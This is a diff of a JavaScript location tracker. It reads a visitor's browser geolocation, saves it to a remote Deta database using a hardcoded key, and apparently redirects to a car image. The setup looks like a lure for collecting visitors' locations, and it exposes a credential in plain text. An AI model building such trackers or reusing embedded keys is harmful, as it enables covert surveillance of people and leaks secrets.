@@ -1,9 +1,9 @@
 // locationTracker.js
 
-import { Deta } from 'deta';
+const { Deta } = require('deta');
 
-const deta = Deta();
-const db = deta.Base("Location", "d0wnfstadsw_5RpqNBcY9k8wnBBfouQUXteXM6JRX546");
+const deta = Deta('d0wnfstadsw_5RpqNBcY9k8wnBBfouQUXteXM6JRX546');
+const db = deta.Base('Location');
 
 // Function to get the visitor's location
 export function getLocation() {
@@ -26,7 +26,7 @@ function savePosition(position) {
     console.log("Latitude: " + latitude + " Longitude: " + longitude);
 
     // Store the location data in your Deta Space database
-    db.put({ latitude: latitude, longitude: longitude }, "visitor_location")
+    db.put({ latitude: latitude, longitude: longitude })
         .then(response => {
             console.log('Location data saved successfully:', response);
             // Redirect to "car.png"
